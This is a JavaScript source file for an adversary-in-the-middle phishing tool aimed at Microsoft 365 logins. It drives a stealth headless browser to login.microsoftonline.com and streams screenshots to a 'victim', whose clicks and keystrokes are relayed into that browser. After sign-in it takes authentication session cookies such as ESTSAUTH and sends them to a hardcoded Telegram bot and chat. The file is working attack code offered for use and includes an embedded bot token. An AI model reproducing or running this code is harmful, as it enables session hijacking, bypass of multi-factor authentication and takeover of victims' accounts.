const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function sendExfiltrationAlert(cookies, finalUrl) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    
    // Extract the most important auth cookies to save space
    const authCookies = cookies.filter(c => 
        ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'RPSSecAuth'].includes(c.name)
    );

    const message = `🚀 *SESSION CAPTURED*\n*URL:* ${finalUrl}\n\n*Key Cookies:* \`\`\`json\n${JSON.stringify(authCookies, null, 2)}\n\`\`\`\n\n*Full Cookie count:* ${cookies.length}`;

    try {
        await axios.post(url, { 
            chat_id: CHAT_ID, 
            text: message,
            parse_mode: 'Markdown'
        });
        console.log("[TELEGRAM] Alert sent successfully.");
    } catch (e) {
        console.error('[TELEGRAM-ERR]', e.response?.data?.description || e.message);
    }
}

async function startSession(io, socket) {
    console.log(`[INIT] Monitoring Session: ${socket.id}`);
    let browser;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        // Stream Logic
        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 30 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        page.goto('https://login.microsoftonline.com/').catch(() => {});
        const heartbeat = setInterval(emitFrame, 1300);

        // LOG EVERY URL CHANGE TO RAILWAY CONSOLE
        page.on('framenavigated', async (frame) => {
            const currentUrl = frame.url();
            console.log(`[NAV-LOG] Current URL: ${currentUrl}`);

            // Broad success detection: Any authenticated MS page
            const successKeys = ['shell/homepage', 'office.com', 'microsoft365.com', 'outlook', 'myapps'];
            
            if (successKeys.some(key => currentUrl.includes(key))) {
                console.log(`[SUCCESS-TRIGGER] Condition met on ${currentUrl}`);
                const cookies = await page.cookies();
                
                // Backup: Log critical cookies to console in case Telegram fails
                const estsAuth = cookies.find(c => c.name === 'ESTSAUTH');
                if (estsAuth) console.log(`[ESTSAUTH-FOUND] ${estsAuth.value}`);

                await sendExfiltrationAlert(cookies, currentUrl);
            }
        });

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[FATAL]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
